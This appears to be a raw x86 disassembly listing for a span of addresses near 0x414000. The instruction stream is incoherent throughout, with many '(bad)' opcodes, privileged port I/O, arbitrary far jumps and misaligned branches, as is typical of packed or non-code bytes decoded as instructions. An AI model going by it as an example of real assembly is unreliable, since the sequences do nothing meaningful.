  413ceb:	jge    0x413cbc
  413ced:	pop    ebp
  413cee:	fnstsw WORD PTR [edi+0x678ae5f3]
  413cf4:	adc    dl,BYTE PTR [eax-0x7b599736]
  413cfa:	xchg   ebp,eax
  413cfb:	shr    al,cl
  413cfd:	scas   al,BYTE PTR es:[edi]
  413cfe:	dec    ebx
  413cff:	jno    0x413c8b
  413d01:	inc    ebx
  413d02:	es push ebp
  413d04:	inc    ebx
  413d05:	inc    esi
  413d06:	jb     0x413cf3
  413d08:	fmul   QWORD PTR es:[esp+ecx*2+0x4ca4c20]
  413d10:	pusha  
  413d11:	in     eax,0xe9
  413d13:	mov    dl,0x95
  413d15:	mov    edi,0xf81cc98c
  413d1a:	call   0x6202e84a
  413d1f:	jmp    DWORD PTR [eax-0x46774344]
  413d25:	xchg   ebx,eax
  413d26:	retf   0xea71
  413d29:	xchg   BYTE PTR [edi],ch
  413d2b:	add    al,0xc7
  413d2d:	stos   DWORD PTR es:[edi],eax
  413d2e:	call   0xd4b308c7
  413d33:	mov    al,ds:0x8419e681
  413d38:	mov    DWORD PTR [edi+0x6],ebx
  413d3b:	xor    DWORD PTR [ebx+0x71],0x113e38ec
  413d42:	arpl   WORD PTR [esi+0x546a876a],dx
  413d48:	aad    0xa5
  413d4a:	push   edi
  413d4b:	xchg   edi,eax
  413d4c:	xchg   ecx,eax
  413d4d:	xchg   ebx,eax
  413d4e:	pop    edi
  413d4f:	mov    ds:0x6849be89,al
  413d54:	mov    cl,0xac
  413d56:	sub    al,BYTE PTR [ebx]
  413d58:	call   0xba1b:0x65ce9794
  413d5f:	js     0x413d9a
  413d61:	addr16 pop esp
  413d63:	fist   DWORD PTR [edx+0xc0b45d5]
  413d69:	inc    ecx
  413d6a:	(bad)  
  413d6b:	iret   
  413d6c:	std    
  413d6d:	test   DWORD PTR [edx],edx
  413d6f:	lahf   
  413d70:	cmp    al,BYTE PTR [edx]
  413d72:	jno    0x413d84
  413d74:	inc    eax
  413d75:	sub    eax,0xc524e53a
  413d7a:	aas    
  413d7b:	int3   
  413d7c:	js     0x413d2b
  413d7e:	mov    BYTE PTR [esi-0x542633a3],cl
  413d84:	test   al,0x95
  413d86:	fisubr WORD PTR [ecx+ebp*1+0x612ceecf]
  413d8d:	(bad)  
  413d8e:	mov    al,0x5a
  413d90:	jne    0x413d7b
  413d92:	loop   0x413da9
  413d94:	scas   al,BYTE PTR es:[edi]
  413d95:	in     eax,0xf8
  413d97:	mov    ebp,ebx
  413d99:	add    al,0xec
  413d9b:	scas   al,BYTE PTR es:[edi]
  413d9c:	icebp  
  413d9d:	add    cl,bh
  413d9f:	lock inc ecx
  413da1:	pop    ss
  413da2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413da3:	xchg   ebp,eax
  413da4:	adc    dl,ch
  413da6:	cdq    
  413da7:	inc    edx
  413da8:	sub    al,0xa2
  413daa:	sahf   
  413dab:	dec    edx
  413dac:	retf   
  413dad:	lds    eax,FWORD PTR [eax+0x7a]
  413db0:	dec    esi
  413db1:	add    esi,DWORD PTR [edx+0x15]
  413db4:	in     eax,dx
  413db5:	arpl   WORD PTR [edi+0x328b2f74],sp
  413dbb:	xlat   BYTE PTR ds:[ebx]
  413dbc:	xlat   BYTE PTR ds:[ebx]
  413dbd:	mov    al,0xd7
  413dbf:	cmp    dh,ch
  413dc1:	int    0xcd
  413dc3:	jle    0x413e33
  413dc5:	dec    esi
  413dc6:	outs   dx,DWORD PTR ds:[esi]
  413dc7:	sahf   
  413dc8:	test   al,0xf7
  413dca:	test   BYTE PTR [ebx+esi*2-0x78a19f67],dl
  413dd1:	ret    0xad99
  413dd4:	call   0x4f01:0x97ebfb98
  413ddb:	(bad)  
  413ddc:	lock mov ecx,0xb4b07f2b
  413de2:	cmp    al,0x30
  413de4:	inc    esp
  413de5:	xchg   esi,eax
  413de6:	fnsave [edx+0x70dba4f]
  413dec:	or     DWORD PTR [ebx+0x64],ebp
  413def:	inc    edi
  413df0:	pusha  
  413df1:	dec    edi
  413df2:	fwait
  413df3:	jg     0x413d90
  413df5:	iret   
  413df6:	xchg   esp,eax
  413df7:	popa   
  413df8:	xchg   ebp,eax
  413df9:	mov    edi,0x1eb49d6a
  413dfe:	xor    cl,ah
  413e00:	sbb    ch,0xcb
  413e03:	frstor [ebx]
  413e05:	xlat   BYTE PTR ds:[ebx]
  413e06:	xchg   DWORD PTR [ecx-0x2f42872f],ebp
  413e0c:	lods   eax,DWORD PTR ds:[esi]
  413e0d:	mov    ah,0x6c
  413e0f:	fisttp QWORD PTR [esi-0x3b]
  413e12:	mov    edi,0x87d7bd98
  413e17:	retf   0xac63
  413e1a:	add    ecx,edi
  413e1c:	pop    edx
  413e1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e1e:	rcl    BYTE PTR [edx],1
  413e20:	and    DWORD PTR ds:0x631786be,0xffffffc8
  413e27:	mov    cl,0xb3
  413e29:	mov    bl,0x3c
  413e2b:	ins    DWORD PTR es:[edi],dx
  413e2c:	dec    edx
  413e2d:	retf   0x8b93
  413e30:	add    dl,BYTE PTR [ebx]
  413e32:	mov    ds:0x9682e511,al
  413e37:	inc    edi
  413e38:	inc    eax
  413e39:	push   esi
  413e3a:	add    eax,0xbe73e506
  413e3f:	enter  0x3895,0x76
  413e43:	mov    dl,BYTE PTR ds:0x4d994f21
  413e49:	scas   al,BYTE PTR es:[edi]
  413e4a:	fwait
  413e4b:	test   eax,0xb2503cc0
  413e50:	test   DWORD PTR [ebp+0x68],ecx
  413e53:	jecxz  0x413e61
  413e55:	stc    
  413e56:	pop    eax
  413e57:	xor    BYTE PTR [esi-0x63],0xf5
  413e5b:	jge    0x413ed0
  413e5d:	xchg   ebp,eax
  413e5e:	xlat   BYTE PTR ds:[ebx]
  413e5f:	sub    cl,BYTE PTR [edx+eax*4+0x1a7b32f]
  413e66:	stc    
  413e67:	icebp  
  413e68:	lods   al,BYTE PTR ds:[esi]
  413e69:	loope  0x413e7c
  413e6b:	addr16 mov eax,ds:0x8f0e
  413e6f:	and    eax,0xd88b47f0
  413e74:	push   es
  413e75:	push   0x234521b3
  413e7a:	lahf   
  413e7b:	rcr    BYTE PTR [esi+0x52],0xf4
  413e7f:	(bad)  
  413e80:	test   al,0x63
  413e82:	cmc    
  413e83:	sub    dl,ah
  413e85:	sar    edx,1
  413e87:	je     0x413efc
  413e89:	jo     0x413e21
  413e8b:	scas   al,BYTE PTR es:[edi]
  413e8c:	je     0x413e5e
  413e8e:	shl    DWORD PTR [eax],cl
  413e90:	inc    ebp
  413e91:	push   edx
  413e92:	test   al,0x5e
  413e94:	adc    al,0x4b
  413e96:	mov    ebx,0xe2bcf6db
  413e9b:	stos   DWORD PTR es:[edi],eax
  413e9c:	gs pop ds
  413e9e:	mov    eax,0x55c2b80c
  413ea3:	pop    ebp
  413ea4:	add    BYTE PTR [ebx-0x1dba8c51],ah
  413eaa:	push   ds
  413eab:	pop    ebp
  413eac:	sbb    edx,DWORD PTR [eax+0x37]
  413eaf:	daa    
  413eb0:	push   ds
  413eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413eb2:	jmp    0xd31e:0x7b7690a9
  413eb9:	xchg   ebp,eax
  413eba:	push   esi
  413ebb:	shl    DWORD PTR [ecx+0x13cfeceb],1
  413ec1:	push   esp
  413ec2:	jo     0x413ef8
  413ec4:	cmp    esi,DWORD PTR [ecx-0x4bb0a140]
  413eca:	add    eax,0x218f356
  413ecf:	cmc    
  413ed0:	push   0x73
  413ed2:	fwait
  413ed3:	popa   
  413ed4:	mov    edi,0xfe2d19b0
  413ed9:	or     BYTE PTR [ecx-0x7a],dh
  413edc:	sbb    eax,0x120ec488
  413ee1:	jbe    0x413efb
  413ee3:	imul   ebp,DWORD PTR [eax],0xa85488bf
  413ee9:	out    0x47,eax
  413eeb:	xchg   ebp,eax
  413eec:	sbb    dl,ah
  413eee:	shl    DWORD PTR [eax-0x603ad19],cl
  413ef4:	fdiv   DWORD PTR [edx+edx*8-0x2b]
  413ef8:	pop    ds
  413ef9:	pop    ss
  413efa:	rcl    esi,1
  413efc:	ret    0xe11
  413eff:	sub    esi,DWORD PTR [ecx]
  413f01:	pop    esi
  413f02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f03:	push   es
  413f04:	cmp    DWORD PTR [ebx+0x13],ebp
  413f07:	call   0xedcf331a
  413f0c:	xchg   edx,eax
  413f0d:	fnstsw WORD PTR ss:[ebx]
  413f10:	test   al,0x6d
  413f12:	dec    esp
  413f13:	xchg   ebp,eax
  413f14:	int    0x75
  413f16:	pop    DWORD PTR [ecx+0x26e0bf02]
  413f1c:	xor    BYTE PTR [esi-0x4af0b050],cl
  413f22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f23:	push   ebp
  413f24:	sub    eax,0x5bfd5baa
  413f29:	out    0xf4,al
  413f2b:	stc    
  413f2c:	jns    0x413f86
  413f2e:	sar    BYTE PTR [edi],1
  413f30:	sub    DWORD PTR [ebx],ecx
  413f32:	inc    esi
  413f33:	mov    edx,0x8d45477d
  413f38:	and    BYTE PTR [edi+0x2ccb1b14],al
  413f3e:	jmp    0x413fb4
  413f40:	mov    dh,0x5f
  413f42:	iret   
  413f43:	jmp    0x413fb3
  413f45:	mov    es,eax
  413f47:	add    eax,0x1c069820
  413f4c:	add    al,0xf8
  413f4e:	sbb    ah,0xde
  413f51:	sub    ch,0x33
  413f54:	imul   esp,esi,0x44b5c16c
  413f5a:	loopne 0x413fcd
  413f5c:	dec    ebp
  413f5d:	pop    ebp
  413f5e:	mov    dh,0x10
  413f60:	jl     0x413f93
  413f62:	div    ah
  413f64:	pop    edi
  413f65:	sbb    BYTE PTR [ebx+edi*2],0xf3
  413f69:	pop    eax
  413f6a:	jg     0x413f53
  413f6c:	inc    esp
  413f6d:	test   esp,esp
  413f6f:	in     al,dx
  413f70:	dec    esp
  413f71:	out    dx,eax
  413f72:	movaps xmm5,XMMWORD PTR [edi]
  413f75:	icebp  
  413f76:	push   ds
  413f77:	mov    ds:0xf1d08512,eax
  413f7c:	or     dl,BYTE PTR [eax]
  413f7e:	scas   al,BYTE PTR es:[edi]
  413f7f:	adc    ecx,DWORD PTR [eax-0x6764710a]
  413f85:	lods   eax,DWORD PTR ds:[esi]
  413f86:	mov    dh,0xd7
  413f88:	es pop eax
  413f8a:	das    
  413f8b:	mov    esp,0x19075dc7
  413f90:	mov    eax,0xe25a574e
  413f95:	pop    eax
  413f96:	fwait
  413f97:	add    DWORD PTR [ecx+0xefddbc1],ecx
  413f9d:	push   esp
  413f9e:	scas   al,BYTE PTR es:[edi]
  413f9f:	mov    ebx,0x1dbcf99a
  413fa4:	repz fcom QWORD PTR [edi]
  413fa7:	(bad)  
  413fa8:	or     DWORD PTR [ebp-0x4f6fb64a],edx
  413fae:	and    al,0x8f
  413fb0:	pop    edi
  413fb1:	ins    DWORD PTR es:[edi],dx
  413fb2:	pop    esp
  413fb3:	xchg   DWORD PTR ds:0x445596f3,esi
  413fb9:	(bad)  
  413fba:	xchg   edi,eax
  413fbb:	adc    ch,BYTE PTR [ebx+0x34]
  413fbe:	pop    ss
  413fbf:	dec    esp
  413fc0:	adc    bh,ah
  413fc2:	xor    esi,esi
  413fc4:	outs   dx,DWORD PTR ds:[esi]
  413fc5:	daa    
  413fc6:	enter  0x244f,0xd9
  413fca:	adc    DWORD PTR [edi+0x6061f561],edx
  413fd0:	in     al,dx
  413fd1:	sbb    ch,BYTE PTR [eax+ecx*8+0x734b3803]
  413fd8:	out    dx,eax
  413fd9:	jae    0x413f90
  413fdb:	leave  
  413fdc:	rcr    DWORD PTR [esi+0x45],1
  413fdf:	pop    es
  413fe0:	(bad)  
  413fe1:	push   es
  413fe2:	fiadd  DWORD PTR [edx-0x76a1c915]
  413fe8:	mov    ?,WORD PTR [ebx-0x2705a87f]
  413fee:	shl    DWORD PTR [esi+ebp*2+0xf],0x9
  413ff3:	push   ebp
  413ff4:	std    
  413ff5:	jp     0x414046
  413ff7:	or     eax,0xf32ae9f5
  413ffc:	push   edx
  413ffd:	ret    0x3699
  414000:	bound  esp,QWORD PTR [esi]
  414002:	jle    0x413f96
  414004:	mov    bl,0x39
  414006:	imul   esp,DWORD PTR [eax-0x6bfe3a95],0xffffffdc
  41400d:	pop    ebx
  41400e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41400f:	(bad)  
  414010:	mov    eax,0xc230014e
  414015:	mov    al,ds:0xb56945b3
  41401a:	(bad)  
  41401b:	out    dx,eax
  41401c:	fmul   DWORD PTR [edi+0x54]
  41401f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414020:	or     edx,DWORD PTR ds:0x1824ac49
  414026:	xchg   ebx,eax
  414027:	mul    eax
  414029:	jnp    0x413fda
  41402b:	jae    0x414016
  41402d:	push   edi
  41402e:	popa   
  41402f:	popa   
  414030:	in     eax,dx
  414031:	cmp    BYTE PTR [esi],ah
  414033:	mov    dl,BYTE PTR [ebp-0x50f2361f]
  414039:	es dec edx
  41403b:	pop    eax
  41403c:	out    0xb6,eax
  41403e:	xor    eax,0x34abc837
  414043:	sub    BYTE PTR [ebx-0x9],ah
  414046:	and    BYTE PTR [esi+ecx*2],dh
  414049:	lods   eax,DWORD PTR ds:[esi]
  41404a:	and    ebp,DWORD PTR [ebp-0x150c8bc6]
  414050:	xor    eax,0xd00dd77d
  414055:	and    al,0xe5
  414057:	xchg   edx,eax
  414058:	stos   BYTE PTR es:[edi],al
  414059:	shl    BYTE PTR [ebx],0xa0
  41405c:	imul   ebx,ebx,0x76c022aa
  414062:	mov    ss,WORD PTR [esi+esi*4]
  414065:	enter  0x1b1a,0x30
  414069:	mov    ecx,0xa2173760
  41406e:	or     ebx,edx
  414070:	jecxz  0x4140c4
  414072:	mov    ch,0xd4
  414074:	lds    ebp,FWORD PTR [ecx-0x4c]
  414077:	jae    0x41403a
  414079:	mov    al,0xe9
  41407b:	rcr    DWORD PTR [ebp*4-0x59f7656d],1
  414082:	pusha  
  414083:	xchg   ebx,eax
  414084:	inc    edx
  414085:	icebp  
  414086:	ror    DWORD PTR [edi+0x4ff0419f],cl
  41408c:	repz mov ebp,0x1efd54e0
  414092:	in     eax,dx
  414093:	jg     0x41410a
  414095:	cmp    edx,DWORD PTR ds:0x96568cc9
  41409b:	add    edx,0xf
  41409e:	out    dx,al
  41409f:	or     eax,0x60638cd6
  4140a4:	lock or al,0xce
  4140a7:	test   DWORD PTR [eax],ecx
  4140a9:	test   al,0x41
  4140ab:	icebp  
  4140ac:	mov    edi,0x101ef5ec
  4140b1:	ret    
  4140b2:	sub    DWORD PTR [edi],0xffffffb3
  4140b5:	dec    edx
  4140b6:	cmc    
  4140b7:	ret    
  4140b8:	and    eax,DWORD PTR [ecx+0x3ab48d86]
  4140be:	dec    esi
  4140bf:	pop    edx
  4140c0:	out    dx,eax
  4140c1:	xor    eax,0xd5efbfd9
  4140c6:	add    edx,ebp
  4140c8:	and    al,0x11
  4140ca:	mov    ch,0xa
  4140cc:	les    eax,FWORD PTR [esi]
  4140ce:	cs aam 0xa3
  4140d1:	scas   eax,DWORD PTR es:[edi]
  4140d2:	cwde   
  4140d3:	ds sar edx,0x92
  4140d7:	loop   0x41408f
  4140d9:	rcr    BYTE PTR [edx+0x15],1
  4140dc:	mov    bh,0xb8
  4140de:	add    DWORD PTR [esi+0x16cff815],edi
  4140e4:	and    ch,dl
  4140e6:	fistp  WORD PTR ds:0x15086c4
  4140ec:	std    
  4140ed:	(bad)  
  4140ef:	aaa    
  4140f0:	and    edi,DWORD PTR [ebp-0x25]
  4140f3:	jmp    0x996e:0x970770ed
  4140fa:	pushf  
  4140fb:	jecxz  0x414166
  4140fd:	rol    BYTE PTR ds:0xf4c96c8,cl
  414103:	sar    BYTE PTR [esi-0x7052ffa7],0xdc
  41410a:	sbb    DWORD PTR [esi],edi
  41410c:	cmp    eax,0x2838acb8
  414111:	adc    DWORD PTR [eax-0x21adf5db],esi
  414117:	stc    
  414118:	lods   al,BYTE PTR ds:[esi]
  414119:	lods   al,BYTE PTR ds:[esi]
  41411a:	pop    ecx
  41411b:	int    0x6b
  41411d:	pushf  
  41411e:	rcl    DWORD PTR [edx-0x45293cb6],1
  414124:	cdq    
  414125:	sahf   
  414126:	ror    BYTE PTR [esi+ebx*4+0x64],0x83
  41412b:	jmp    0xec20:0xc4be1adf
  414132:	ins    DWORD PTR es:[edi],dx
  414133:	mov    fs,edx
  414135:	call   0xbfc10f15
  41413a:	jb     0x414116
  41413c:	xor    ebx,edx
  41413e:	pop    eax
  41413f:	out    0xae,eax
  414141:	jno    0x4140f1
  414143:	adc    BYTE PTR [ebp+0x7],bl
  414146:	inc    ecx
  414147:	dec    esp
  414148:	dec    edx
  414149:	cmp    eax,0xca3e06a6
  41414e:	pop    eax
  41414f:	and    cl,BYTE PTR cs:[edi-0xe]
  414153:	mov    cs,edi
  414155:	cmp    eax,0xe30dc1b2
  41415a:	pop    edi
  41415b:	push   ecx
  41415c:	add    eax,0xbaf4b558
  414161:	stos   BYTE PTR es:[edi],al
  414162:	ds mov esp,0x6327ebf7
  414168:	test   edx,ecx
  41416a:	scas   al,BYTE PTR es:[edi]
  41416b:	jno    0x414143
  41416d:	mov    bl,0x97
  41416f:	xlat   BYTE PTR ds:[ebx]
  414170:	mov    BYTE PTR [esi+eiz*2+0x7405cbbe],ah
  414177:	dec    esp
  414178:	retf   
  414179:	xor    eax,0xb80f6b5e
  41417e:	pop    esp
  41417f:	mov    cl,0x4c
  414181:	and    dl,bl
  414183:	sbb    BYTE PTR [edi+0x57],bh
  414186:	in     eax,0xd4
  414188:	outs   dx,BYTE PTR ds:[esi]
  414189:	jmp    0x7f9d:0xeb60d8bc
  414190:	xor    al,0xcb
  414192:	sub    BYTE PTR [esi-0x4058225a],ah
  414198:	test   DWORD PTR [ebx-0x2982073d],0x75c5b684
  4141a2:	dec    edi
  4141a3:	ds pop es
  4141a5:	call   0x10ec:0xd7d2e16d
  4141ac:	dec    edx
  4141ad:	push   ds
  4141ae:	cld    
  4141af:	lock add DWORD PTR [ebp+0x98d8675],esi
  4141b6:	adc    eax,0x1494f6
  4141bb:	add    ch,cl
  4141bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141be:	or     BYTE PTR [edi-0x10d1c86b],0x45
  4141c5:	cmp    al,0x32
  4141c7:	or     esp,DWORD PTR [eax]
  4141c9:	rol    bh,0xe3
  4141cc:	fimul  WORD PTR [eax+0x1f]
  4141cf:	es cmp DWORD PTR fs:[edx+edx*1],esi
  4141d4:	mov    bh,0x19
  4141d6:	adc    DWORD PTR [ecx+0x79],ebx
  4141d9:	(bad)  
  4141da:	jge    0x4141b5
  4141dc:	stos   BYTE PTR es:[edi],al
  4141dd:	sbb    al,0x9b
  4141df:	ins    BYTE PTR es:[edi],dx
  4141e0:	dec    esi
  4141e1:	icebp  
  4141e2:	mov    edi,0x8c0a7360
  4141e7:	add    DWORD PTR [edi+0x326e746b],0xf5d45885
  4141f1:	in     eax,0x5a
  4141f3:	inc    ebp
  4141f4:	add    al,0xff
  4141f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141f7:	inc    ecx
  4141f9:	sbb    edi,DWORD PTR [ebp-0x951e882]
  4141ff:	pop    ecx
  414200:	push   eax
  414201:	xchg   ebp,eax
  414202:	push   ds
  414203:	xor    al,0x8a
  414205:	xor    BYTE PTR ds:0x1bd1d9b3,al
  41420b:	inc    ebx
  41420c:	jecxz  0x41425e
  41420e:	pop    edi
  41420f:	pop    edi
  414210:	rol    BYTE PTR [esi+esi*4],1
  414213:	xchg   DWORD PTR [eax-0x52],esp
  414216:	call   0x8cf6e657
  41421b:	jge    0x4141fb
  41421d:	fs add eax,0xae1713f3
  414223:	dec    esi
  414224:	and    eax,0xda4d7ab5
  414229:	clc    
  41422a:	sub    al,0x8e
  41422c:	mov    ecx,DWORD PTR [ecx-0x152a25bc]
  414232:	or     DWORD PTR [edi-0x79bac2ea],ebx
  414238:	sbb    DWORD PTR [ebx-0x38],esi
  41423b:	pushf  
  41423c:	sbb    eax,0x1e9bf20b
  414241:	dec    esi
  414242:	xchg   edi,eax
  414243:	stos   BYTE PTR es:[edi],al
  414244:	add    cl,0x7d
  414247:	repz pop esi
  414249:	leave  
  41424a:	test   eax,0x103852a9
  41424f:	or     ebx,DWORD PTR [edx-0x1b]
  414252:	gs icebp 
  414254:	mov    al,BYTE PTR [edx]
  414256:	sub    DWORD PTR [edx+0x6e50ec93],ecx
  41425c:	call   0xa0b6:0x833a3ce0
  414263:	jnp    0x414242
  414265:	jo     0x4142bf
  414267:	add    bl,BYTE PTR [ebp-0x498d8cc2]
  41426d:	adc    al,0x7b
  41426f:	loope  0x414288
  414271:	ja     0x414231
  414273:	adc    eax,0x925edc18
  414278:	dec    eax
  414279:	rol    BYTE PTR [edi+0x2f],1
  41427c:	fnstenv [ebp+0x617b5deb]
  414282:	jb     0x4142a7
  414284:	fcmovnb st,st(6)
  414286:	mov    ch,cl
  414288:	les    eax,FWORD PTR [eax+edi*4]
  41428b:	jns    0x414306
  41428d:	adc    DWORD PTR [esi],ebx
  41428f:	inc    eax
  414290:	pop    esi
  414291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414292:	dec    eax
  414293:	xchg   edi,eax
  414294:	out    dx,eax
  414295:	adc    al,0x1a
  414297:	jle    0x41426c
  414299:	or     ebx,DWORD PTR [edx]
  41429b:	xor    bl,ch
  41429d:	jmp    0x597b13d
  4142a2:	int3   
  4142a3:	or     cl,BYTE PTR [di+0x2277]
  4142a8:	jbe    0x414251
  4142aa:	or     BYTE PTR [ebp+0x3],0x29
  4142ae:	stos   BYTE PTR es:[edi],al
  4142af:	cmp    eax,0xd7e16b86
  4142b4:	dec    ebp
  4142b5:	mov    edi,0x589ea83b
  4142ba:	sti    
  4142bb:	pop    ds
  4142bc:	and    DWORD PTR [ebp+0x3c980a5f],ebp
  4142c2:	jecxz  0x414272
  4142c4:	aaa    
  4142c5:	int3   
  4142c6:	push   0xffffff85
  4142c8:	repnz daa 
  4142ca:	sti    
  4142cb:	mov    eax,ds:0x29d0c5a7
  4142d0:	cmp    al,0x9a
  4142d2:	scas   al,BYTE PTR es:[edi]
  4142d3:	cmc    
  4142d4:	js     0x414323
  4142d6:	icebp  
  4142d7:	mov    edi,DWORD PTR [eax+ebx*2+0x19e22c2d]
  4142de:	jno    0x414323
  4142e0:	ja     0x414285
  4142e2:	dec    esi
  4142e3:	xor    eax,0x49ac538c
  4142e8:	mov    ebp,0xac163ed
  4142ed:	jmp    0xad66e65f
  4142f2:	mov    ds:0x12cc26d7,eax
  4142f7:	ficomp WORD PTR [esi]
  4142f9:	push   edx
  4142fa:	sbb    al,0x91
  4142fc:	mov    dh,0xc7
  4142fe:	sbb    DWORD PTR [esi+0x74],edi
  414301:	mov    dl,0xee
  414303:	mov    esi,0x14c8c6b7
  414308:	mov    ah,0x52
  41430a:	mov    dh,0x9b
  41430c:	and    esi,DWORD PTR [edx+ebp*2+0x68]
  414310:	adc    edx,DWORD PTR [ebp-0x5c]
  414313:	push   ds
  414314:	push   ebx
  414315:	xchg   DWORD PTR [edx+0xade5672],ebp
  41431b:	xlat   BYTE PTR ds:[ebx]
  41431c:	fisub  WORD PTR [esi+edi*1-0xa2920b4]
  414323:	loop   0x4142f5
  414325:	stos   BYTE PTR es:[edi],al
  414326:	iret   
  414327:	add    ah,dh
  414329:	jp     0x41437a
  41432b:	pop    ds
  41432c:	repz push eax
  41432e:	jl     0x4143a6
  414330:	aam    0x46
  414332:	pop    edi
  414333:	into   
  414334:	inc    esi
  414335:	mov    al,ds:0xde851535
  41433a:	scas   al,BYTE PTR es:[edi]
  41433b:	mov    bh,0x87
  41433d:	arpl   WORD PTR [edi],cx
  41433f:	jl     0x4142c1
  414341:	xchg   esp,eax
  414342:	xchg   ebp,eax
  414344:	mov    cl,0x11
  414346:	cmc    
  414347:	sbb    bh,BYTE PTR [edx]
  414349:	lea    ecx,[edi+0x42222614]
  41434f:	int    0xdc
  414351:	scas   eax,DWORD PTR es:[edi]
  414352:	leave  
  414353:	inc    ebp
  414354:	popf   
  414355:	sub    eax,0xbd35d53a
  41435a:	in     al,dx
  41435b:	mov    es,WORD PTR [edx]
  41435d:	aas    
  41435e:	jne    0x414376
  414360:	add    BYTE PTR [edi],dh
  414362:	jmp    0x4142fa
  414364:	xchg   BYTE PTR [ebp-0x53eddcd8],cl
  41436a:	or     BYTE PTR [esi-0x5d],cl
  41436d:	add    BYTE PTR [eax+0x16],bh
  414370:	int3   
  414371:	jne    0x4143c9
  414373:	pop    ecx
  414374:	and    dh,BYTE PTR ds:0x1b8359cf
  41437a:	xor    esi,eax
  41437c:	ja     0x4143bb
  41437e:	(bad)
  414381:	or     DWORD PTR [ecx+0x1ad75977],ebx
  414387:	push   ebp
  414388:	xor    bh,BYTE PTR [esi]
  41438a:	mov    bh,0x6c
  41438c:	xchg   ebx,eax
  41438d:	dec    ebp
  41438e:	push   0x669a6479
  414393:	das    
  414394:	lea    edx,[ebx-0x15]
  414397:	daa    
  414398:	push   cs
  414399:	popf   
  41439a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41439b:	in     al,dx
  41439c:	mov    bh,0x42
  41439e:	xlat   BYTE PTR ds:[ebx]
  41439f:	mov    eax,DWORD PTR [edx-0x77]
  4143a2:	xchg   edx,eax
  4143a3:	loopne 0x414354
  4143a5:	sub    BYTE PTR [esi-0x285c4f12],cl
  4143ab:	ret    
  4143ac:	outs   dx,BYTE PTR ds:[esi]
  4143ad:	jne    0x4143eb
  4143af:	or     BYTE PTR [ebx],dl
  4143b1:	(bad)  [esi-0x4dbe51ae]
  4143b7:	jnp    0x414367
  4143b9:	loope  0x41434a
  4143bb:	mov    dh,0xe2
  4143bd:	add    bh,BYTE PTR [esi+0x3c52b94]
  4143c3:	dec    ebp
  4143c4:	(bad)  
  4143c6:	mov    cl,0x5e
  4143c8:	scas   al,BYTE PTR es:[edi]
  4143c9:	ret    0x69f4
  4143cc:	in     eax,dx
  4143cd:	xor    bl,cl
  4143cf:	and    eax,0x407d9f97
  4143d4:	repnz cwde 
  4143d6:	retf   0xd212
  4143d9:	rcl    BYTE PTR [edx+0x56395a0e],cl
  4143df:	dec    edi
  4143e0:	test   al,0x32
  4143e2:	aad    0xe7
  4143e4:	sahf   
  4143e5:	add    DWORD PTR [ecx+esi*1+0x38f5323e],eax
  4143ec:	sbb    ch,BYTE PTR ss:0x2137153
  4143f3:	and    edi,DWORD PTR [esi+0x29a59ec]
  4143f9:	and    BYTE PTR [ebp+0x67],dl
  4143fc:	or     DWORD PTR [ebx+0x5b],edx
  4143ff:	lods   al,BYTE PTR ds:[esi]
  414400:	rcr    DWORD PTR [ebx+0xe],1
  414403:	push   ds
  414404:	mov    al,0x3f
  414406:	xchg   ebx,eax
  414407:	aad    0xb0
  414409:	adc    BYTE PTR [esi-0x7c],0x5b
  41440d:	cmp    DWORD PTR [esp+edx*2-0x64],ebx
  414411:	sbb    eax,0xce820491
  414416:	pop    esp
  414417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414418:	pop    ecx
  414419:	in     al,dx
  41441a:	lods   al,BYTE PTR ds:[esi]
  41441b:	dec    edx
  41441c:	jecxz  0x4143d5
  41441e:	aaa    
  41441f:	aam    0xcd
  414421:	mov    esp,0xd297744
  414426:	push   eax
  414427:	cmp    ebx,DWORD PTR [ebp+0x26]
  41442a:	mov    eax,ds:0xb3b61b49
  41442f:	lock cmp eax,0xd4d66574
  414435:	pop    ebx
  414436:	into   
  414437:	sbb    edx,edi
  414439:	dec    edx
  41443a:	mov    esi,0xd82614ab
  41443f:	sbb    ah,BYTE PTR [esi+0x36]
  414442:	and    BYTE PTR [esi+0xa857a76],bh
  414448:	or     DWORD PTR [edi+0x2e],ebp
  41444b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41444c:	enter  0x4ae9,0xa
  414450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414451:	xor    al,ah
  414453:	nop
  414454:	xchg   esi,eax
  414455:	add    dh,BYTE PTR [esi-0x1faab710]
  41445b:	add    ebx,ebx
  41445d:	add    al,0x9f
  41445f:	or     esp,DWORD PTR [eax-0x8fce6ef]
  414465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414466:	push   esp
  414467:	mov    al,ds:0xde1e1707
  41446c:	jb     0x41446e
  41446e:	inc    ebx
  41446f:	jmp    0x26649b
  414474:	jbe    0x4144ab
  414476:	sti    
  414477:	mov    bh,0xd6
  414479:	nop    ebx
  41447c:	out    0xcf,eax
  41447e:	out    0xa8,al
  414480:	xchg   esp,eax
  414481:	inc    esp
  414482:	cmp    BYTE PTR [edx-0xabe33bf],dl
  414488:	mov    al,ds:0x1ddf4421
  41448d:	pusha  
  41448e:	xor    bh,BYTE PTR [edx+0x39]
  414491:	pop    eax
  414492:	aam    0x2a
  414494:	aam    0xaa
  414496:	out    0x76,eax
  414498:	jle    0x4144b1
  41449a:	cli    
  41449b:	aas    
  41449c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41449d:	xchg   esp,eax
  41449e:	pushf  
  41449f:	retf   
  4144a0:	stc    
  4144a1:	inc    ebx
  4144a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144a3:	jmp    0x194d:0x2101feb5
  4144aa:	loope  0x414440
  4144ac:	rol    DWORD PTR [esp+edi*1],1
  4144af:	adc    esi,ebp
  4144b1:	ss add eax,0xda54e067
  4144b7:	push   edi
